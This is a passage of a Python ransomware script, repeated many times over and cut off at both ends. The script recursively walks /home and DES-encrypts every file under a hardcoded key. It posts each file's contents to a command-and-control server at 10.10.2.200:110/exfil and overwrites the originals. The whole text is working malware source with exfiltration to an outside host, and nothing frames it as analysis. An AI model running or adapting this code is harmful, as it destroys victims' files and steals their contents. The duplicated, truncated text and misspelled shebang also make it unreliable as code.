    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
